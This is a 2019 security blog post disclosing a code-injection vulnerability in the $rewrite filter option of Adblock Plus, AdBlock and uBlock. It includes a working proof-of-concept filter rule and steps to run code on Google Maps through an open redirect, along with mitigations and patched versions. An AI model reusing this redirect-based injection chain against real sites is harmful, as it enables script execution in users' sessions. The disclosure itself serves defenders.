<!DOCTYPE html>
<html lang="en-us">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<meta name="theme-color" content="#494f5c">
	<meta name="msapplication-TileColor" content="#494f5c">
<meta itemprop="name" content="Adblock Plus filter lists may execute arbitrary code in web pages">
<meta itemprop="description" content="A new version of Adblock Plus was released on July 17, 2018. Version 3.2 introduced a new filter option for rewriting requests. A day later AdBlock followed suit and released support for the new filter option. uBlock, being owned by AdBlock, also implemented the feature.
Under certain conditions the $rewrite filter option enables the publishers of these extensions and the maintainers of filter lists to inject arbitrary code in web pages.">
<meta itemprop="datePublished" content="2019-04-15T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2019-04-15T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="835">



<meta itemprop="keywords" content="firefox,chrome,browser,extensions,adblock plus,security,google," /><meta property="og:title" content="Adblock Plus filter lists may execute arbitrary code in web pages" />
<meta property="og:description" content="A new version of Adblock Plus was released on July 17, 2018. Version 3.2 introduced a new filter option for rewriting requests. A day later AdBlock followed suit and released support for the new filter option. uBlock, being owned by AdBlock, also implemented the feature.
Under certain conditions the $rewrite filter option enables the publishers of these extensions and the maintainers of filter lists to inject arbitrary code in web pages." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://armin.dev/blog/2019/04/adblock-plus-code-injection/" />
<meta property="article:published_time" content="2019-04-15T00:00:00+00:00" />
<meta property="article:modified_time" content="2019-04-15T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Adblock Plus filter lists may execute arbitrary code in web pages"/>
<meta name="twitter:description" content="A new version of Adblock Plus was released on July 17, 2018. Version 3.2 introduced a new filter option for rewriting requests. A day later AdBlock followed suit and released support for the new filter option. uBlock, being owned by AdBlock, also implemented the feature.
Under certain conditions the $rewrite filter option enables the publishers of these extensions and the maintainers of filter lists to inject arbitrary code in web pages."/>

	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
	<link rel="shortcut icon" href="/favicon.ico">

	<title>Adblock Plus filter lists may execute arbitrary code in web pages Â· Armin Sebastian</title>
	<link rel="stylesheet" href="https://armin.dev/css/style.min.8d137e32cd752710e46928daa817e0f4fca34d07262680887f5bd46761cc01b7.css" integrity="sha256-jRN+Ms11JxDkaSjaqBfg9PyjTQcmJoCIf1vUZ2HMAbc=">
	
	<link rel="stylesheet" href="https://armin.dev/css/style.css">
</head>

<body id="page">
	
	<header id="site-header" class="animated slideInUp faster">
		<div class="hdr-wrapper section-inner">
			<div class="hdr-left">
				<div class="site-branding">
					<a href="https://armin.dev">Home</a>
				</div>
				<nav class="site-nav hide-in-mobile">
					<a href="https://armin.dev/blog">Posts</a>
				</nav>
			</div>
			<div class="hdr-right hdr-icons">
				<span class="hdr-soc hide-in-mobile"><a href="https://github.com/dessant" target="_blank" rel="noopener" title="Github "><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="https://twitter.com/dessantx" target="_blank" rel="noopener" title="Twitter "><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://www.patreon.com/dessant" target="_blank" rel="noopener" title="Patreon "><svg
  class="feather"
  width="24"
  height="24"
  viewBox="0 0 24 24"
  xmlns="http://www.w3.org/2000/svg"
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  stroke-linecap="round"
  stroke-linejoin="round"
>
  <path d="M14 13a5 5 0 1 0 0-10 5 5 0 0 0 0 10z" />
  <path d="M5 3v18" />
</svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
			</div>
		</div>
	</header>
	<div id="mobile-menu" class="animated fast">
		<ul>
			<li><a href="https://armin.dev/blog">Posts</a></li>
		</ul>
	</div>


	<main class="site-main section-inner animated fadeIn faster">
		<article class="thin">
			<header class="post-header">
				<div class="post-meta"><span>Apr 15, 2019</span></div>
				<h1>Adblock Plus filter lists may execute arbitrary code in web pages</h1>
			</header>
			<div class="content">
				<p>A new version of <a href="https://adblockplus.org">Adblock Plus</a> was <a href="https://adblockplus.org/releases/adblock-plus-32-for-chrome-firefox-and-opera-released">released</a> on July 17, 2018. Version 3.2 introduced a new filter option for rewriting requests. A day later <a href="https://getadblock.com">AdBlock</a> followed suit and released support for the new filter option. <a href="https://www.ublock.org">uBlock</a>, being owned by AdBlock, also implemented the feature.</p>
<p>Under certain conditions the <code>$rewrite</code> filter option enables the publishers of these extensions and the maintainers of filter lists to inject arbitrary code in web pages.</p>
<p>The affected extensions have more than 100 million active users, and Adblock Plus has several other forks controlled by third-party developers.</p>
<p>The feature is trivial to exploit in order to attack any sufficiently complex web service, including Google services, while attacks are difficult to detect and are deployable in all major browsers.</p>
<p>Considering the nature and implications of the uncovered vulnerabilities, and given that filter lists have been employed in the past for <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/285">politically motivated attacks</a>, details of the exploit chain are publicly disclosed to ensure the fastest possible propagation of upcoming mitigations in the affected browser extensions and web services.</p>
<p>The following CVE identifiers have been assigned for the vulnerable extensions: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11593">CVE-2019-11593</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11594">CVE-2019-11594</a> and <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11595">CVE-2019-11595</a>.</p>
<p><a href="https://github.com/gorhill/uBlock">uBlock Origin</a> is not vulnerable to the described attack.</p>
<h2 id="attack">Attack<a href="#attack" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>The <code>$rewrite</code> filter option is used by some ad blockers to remove tracking data and block ads by redirecting requests. The option allows rewrites only within the same origin, and requests of <code>SCRIPT</code>, <code>SUBDOCUMENT</code>, <code>OBJECT</code> and <code>OBJECT_SUBREQUEST</code> types are not processed.</p>
<p>However, web services can be exploited with the help of this filter option when they use XMLHttpRequest or Fetch to download code snippets for execution, while allowing requests to arbitrary origins and hosting a server-side open redirect.</p>
<p>Extensions periodically update filters at intervals determined by filter list operators. Organizations and individuals may be targeted based on the IP addresses from which the updates are requested, delivering the malicious payload only to targets, while keeping the public filter list unchanged.</p>
<p>The existence of an attack may be difficult to prove, unless the device is monitored during the attack, because threat actors could set a short expiration time for the malicious filter list, which is then replaced with a benign one.</p>
<p>The following criteria must be met for a web service to be exploitable using this method:</p>
<ol>
<li>The page must load a JS string using XMLHttpRequest or Fetch and execute the returned code</li>
<li>The page must not restrict origins from which it can fetch using Content Security Policy directives, or it must not validate the final request URL before executing the downloaded code</li>
<li>The origin of the fetched code must have a server-side open redirect or it must host arbitrary user content</li>
</ol>
<p>Filter list operators may deliver a rule update such as this:</p>
<pre><code>/^https://www.google.com/maps/_/js/k=.*/m=pw/.*/rs=.*/$rewrite=/search?hl=en-US&amp;source=hp&amp;biw=&amp;bih=&amp;q=majestic-ramsons.herokuapp.com&amp;btnI=I%27m+Feeling+Lucky&amp;gbv=1
</code></pre><p>The above rule redirects the target request to Google&rsquo;s <em>I&rsquo;m Feeling Lucky</em> search service, which then redirects to a page with the payload: <code>alert(document.domain)</code>.</p>
<p>Steps for running arbitrary code on Google Maps:</p>
<ol>
<li>Install either Adblock Plus, AdBlock or uBlock in a new browser profile</li>
<li>Visit the options of the extension and add the <a href="https://majestic-ramsons.herokuapp.com/filter-list.txt">example filter list</a>, this step is meant to simulate a malicious update to a default filter list</li>
<li>Navigate to <a href="https://www.google.com/maps/?hl=en">Google Maps</a></li>
<li>An alert with &ldquo;<a href="http://www.google.com">www.google.com</a>&rdquo; should pop up after a couple of seconds</li>
</ol>
<p>Gmail and Google Images also meet the listed conditions to be exploitable.</p>
<p>Google has been notified about the exploit, but the report was closed as &ldquo;Intended Behavior&rdquo;, since they consider the potential security issue to be present solely in the mentioned browser extensions. This is an unfortunate conclusion, because the exploit is composed of a set of browser extension and web service vulnerabilities that have been chained together.</p>
<p>Please note that the vulnerability is not limited to Google services, other web services could be affected as well.</p>
<h2 id="mitigation">Mitigation<a href="#mitigation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<p>The exploit can be mitigated in the affected web services by whitelisting known origins using the <code>connect-src</code> CSP header, or by eliminating server-side open redirects.</p>
<p>Ad blocking extensions should consider dropping support for the <code>$rewrite</code> filter option. It&rsquo;s always possible to abuse the feature to some degree, even if only images or style sheets are allowed to be redirected.</p>
<p>Users may also switch to <a href="https://github.com/gorhill/uBlock">uBlock Origin</a>, which does not support the vulnerable filter option. The feature has been rejected by the maintainer of the extension, citing concerns over <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/46#issuecomment-391303700">security and performance</a>.</p>
<p>As of April 29, 2019 the discussed extensions have been patched, users should update to the latest versions. Vulnerable versions (inclusive): Adblock Plus between 3.2 and 3.5.1, AdBlock between 3.32.0 and 3.44.0, and uBlock between 0.9.5.11 and 0.9.5.14.</p>
<hr>
<h4 id="updates">Updates<a href="#updates" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<ul>
<li>
<p>April 17, 2019: it has been clarified who can exploit the vulnerability and how attacks may unfold. The safety of uBlock Origin has been further emphasized due to the confusion around the uBlock brand name.</p>
</li>
<li>
<p>May 1, 2019: the assigned CVE identifiers and the vulnerable extension versions have been listed.</p>
</li>
</ul>
<hr>
<p>This post and my open source <a href="https://github.com/dessant">projects</a>
are made possible thanks to the support of awesome backers.
If you&rsquo;d like to join them, please consider contributing with
<a href="https://armin.dev/go/patreon?pr=blog&amp;src=site">Patreon</a>,
<a href="https://armin.dev/go/paypal?pr=blog&amp;src=site">PayPal</a> or
<a href="https://armin.dev/go/bitcoin?pr=blog&amp;src=site">Bitcoin</a>.</p>

			</div>
			<hr class="post-end">
			<footer class="post-info">
				<p>
					<div class="post-tags">
						<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://armin.dev/blog/tags/firefox">firefox</a></span><span class="tag"><a href="https://armin.dev/blog/tags/chrome">chrome</a></span><span class="tag"><a href="https://armin.dev/blog/tags/browser">browser</a></span><span class="tag"><a href="https://armin.dev/blog/tags/extensions">extensions</a></span><span class="tag"><a href="https://armin.dev/blog/tags/adblock-plus">adblock plus</a></span><span class="tag"><a href="https://armin.dev/blog/tags/security">security</a></span><span class="tag"><a href="https://armin.dev/blog/tags/google">google</a></span>
					</div>
				</p>
				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2019-04-15</p>
			</footer>
		</article>
		<div class="post-nav thin">
			<a class="next-post" href="https://armin.dev/blog/2019/08/supporting-browser-extension-developers/">
				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;Newer</span><br><span>Google and Mozilla are failing to support browser extension developers</span>
			</a>
			<a class="prev-post" href="https://armin.dev/blog/2019/03/firefox-extensions-browsing-data-security/">
				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Firefox extensions cannot securely clear browsing data</span>
			</a>
		</div>
		<div id="comments" class="thin">
</div>
	</main>

	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
		<p>&copy; 2020 <a href="https://armin.dev">Armin Sebastian</a> &#183; <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="noopener">CC BY 4.0</a> &#183; <a href="https://armin.dev/blog/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></p>
	</footer>


	<script src="https://armin.dev/js/main.min.8f39f24808e9d0a9b02da58c2d2838da859dc0b7bdfadbdb1883aae8b6adacfe.js" integrity="sha256-jznySAjp0KmwLaWMLSg42oWdwLe9+tvbGIOq6LatrP4="></script>

<script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6a65c9285b3c1382","version":"2021.10.0","r":1,"token":"64434c3dd59b49a6a9032ff6989a1601","si":100}'></script>
</body>

</html>
